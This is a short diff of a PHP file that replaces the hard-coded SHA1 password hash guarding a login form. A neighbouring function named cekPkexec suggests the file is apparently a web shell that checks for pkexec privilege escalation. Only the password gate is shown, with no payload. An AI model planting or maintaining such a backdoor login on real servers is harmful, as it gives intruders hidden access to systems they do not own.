@@ -458,7 +458,7 @@ function cekPkexec() {
 }
 
 //login
-$passwd = '5c3c0d4ceddf2d80aad8df2c5e28e976c19e286a';
+$passwd = 'add9513f396ac1198675b06122bba943eb9e0776';
 $my_self = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
 if (isset($_POST['btn-login'])) {
     if (SHA1($_POST['pass']) == $passwd) {
